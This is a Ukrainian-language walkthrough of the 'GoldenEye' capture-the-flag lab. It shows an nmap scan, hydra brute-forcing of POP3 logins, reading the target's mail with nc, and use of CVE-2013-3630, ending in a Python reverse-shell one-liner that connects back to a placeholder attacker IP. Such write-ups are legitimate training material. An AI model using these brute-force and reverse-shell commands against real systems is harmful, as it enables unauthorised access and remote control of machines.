
# GoldenEye
## Bond, James Bond. A guided CTF.

Складність: Medium

Ціль: 10.112.135.94

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):
```bash
└─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.112.135.94
```

![nmap1](./img/nmap1.png)
![nmap2](./img/nmap1.png)

### 1.2. Веб-розвідка:

`http://10.112.135.94/terminal.js`

![terminal.js source](./img/terminal_js.png)

LoginPass - `Boris:InvincibleHack3r` 

![cyber_chef.png](./img/cyber_chef.png)


Логінимся з отриманими даними за адресою `http://10.112.135.94/sev-home/` , якщо не пускає спробуй написати логін з малої букви.

![sev-home_login.png](./img/sev-home_login.png)
![sev-home_main.png](./img/sev-home_main.png)
![sev-home_source.png](./img/sev-home_source.png)

Пробую підключитись до `55007 pop3` через `nc` з даними користувача `boris`, але отримую помилку автентифікації.

![nc_pop3_auth_error.png](nc_pop3_auth_error.png)

Використовую брутфорс `hydra` для логінів `boris` та `natalya`.
```bash
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -V -f -s 55007 10.112.135.94 pop3
```

Знайдено пару `natalya:bird`.

![hydra_natalya.png](./img/hydra_natalya.png)

Знову пробую підключитись на порт `55007`.
```bash
nc -nv 10.112.135.94 55007
USER natalya
PASS bird
STAT
LIST
RETR 1
RETR 2
```

![POP3_natalya.png](./img/POP3_natalya.png)

Додаю адресу http://severnaya-station.com/gnocertdir/ => /etc/hosts
Та логінюсь з даними з листа. Бачу повідомлення від `dr doak`. 

![severnaya_doak.png](./img/severnaya_doak.png)

Знову запускаю брут.
```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -V -f -s 55007 10.112.135.94 pop3
```

![hydra_doak.png](./img/hydra_doak.png)

Отримую логінпасс `doak:goat`. Перевіряю його листи.
```bash
nc -nv 10.112.135.94 55007
USER doak
PASS goat
STAT
LIST
RETR 1
```

![POP3_doak.png](./img/POP3_doak.png)

Логінимся з цими даними на попередній сайт. Там знайдено `s3cret.txt`.

![s3cret_txt.png](./img/s3cret_txt.png)

Під час дослідження картинкі знайдено такі метадані.

![exiftool.png](./img/exiftool.png)

![for007base64.png](./img/for007base64.png)

За допомогою цього пароля заходимо в адмінку на сайті.
Далі використаю CVE-2013-3630 та відповідну команду `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_TUN0_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

Отримую довгоочікуваний shell.

![rev_shell_www.png](./img/rev_shell_www.png)



![flag.png](flag.png)
